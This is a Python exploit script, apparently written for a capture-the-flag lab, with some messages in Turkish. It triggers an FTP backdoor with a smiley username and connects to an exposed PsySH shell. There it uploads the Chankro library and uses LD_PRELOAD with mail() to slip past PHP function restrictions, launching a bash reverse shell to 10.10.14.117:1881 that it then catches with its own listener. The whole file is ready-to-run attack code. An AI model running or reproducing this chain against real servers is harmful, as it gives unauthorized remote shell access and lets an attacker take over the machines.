import ftplib
import sys
import socket
import base64
import time


target = sys.argv[1] 
psysh_port = int(sys.argv[2])

def connect_ftp_server():
    username = "test:)"  
    password = "test"

    print("Triggering ftp exploit...")
    try:
        ftp = ftplib.FTP(target, username, password,timeout=10)
        time.sleep(2)
        ftp.quit()
    except Exception as err:
        print("Error => ", err)
    finally:
        time.sleep(2)


def connect_psysh():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, psysh_port))
    print("[*] PsySH'ye bağlandı!")

    def send_command(cmd, delay=0.5):
        s.sendall((cmd + "\n").encode())  
        time.sleep(delay)  
        response = s.recv(4096).decode()
        print(response)

    
    print("[*] Uploading chankro.so")
    send_command("$f = fopen('/tmp/chankro.so', 'w');")

    with open('/opt/Chankro/hook64.so', 'rb') as f:
        while True:
            d = f.read(1024)
            if not d:
                break
            encoded_data = base64.b64encode(d).decode()
            send_command(f"fwrite($f, base64_decode('{encoded_data}'));")

    send_command("fclose($f)")
    print("[+] Uploaded chankro.so")

    
    shell = base64.b64encode(b"bash -c 'bash -i >& /dev/tcp/10.10.14.117/1881 0>&1'").decode()
    send_command(f"file_put_contents('/tmp/acpid.socket', base64_decode('{shell}'));")
    print("[+] Uploaded shell as /tmp/acpid.socket")

    
    send_command("putenv('CHANKRO=/tmp/acpid.socket');")
    send_command("putenv('LD_PRELOAD=/tmp/chankro.so');")
    print("[+] Set env variables")

    
    print("[*] Triggering with mail call\n[*] Waiting for shell. This could take a minute.")
    send_command("mail('a','a','a','a');")

    
    s.close()
    print("[+] Exploit işlemi tamamlandı, reverse shell'i kontrol et.")

def listen_reverse_shell(port=1881):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    server.bind(("0.0.0.0", port))  
    server.listen(1)  
    print(f"[*] Listening on port {port}...")

    client_socket, client_address = server.accept()
    print(f"[+] Connection received from {client_address[0]}:{client_address[1]}")
    client_socket.send(b"[*] Connected to Python listener!\n")

    while True:
        try:
            cmd = input("Shell> ")
            if cmd.lower() in ["exit", "quit"]:
                print("[*] Closing connection...")
                client_socket.send(b"exit\n")
                client_socket.close()
                break

            client_socket.send(cmd.encode() + b"\n")            
            response = client_socket.recv(4096).decode()
            print(response)

        except KeyboardInterrupt:
            print("\n[*] CTRL+C detected, closing connection.")
            client_socket.close()
            break


def main():
    connect_ftp_server()
    connect_psysh()
    listen_reverse_shell()

main()
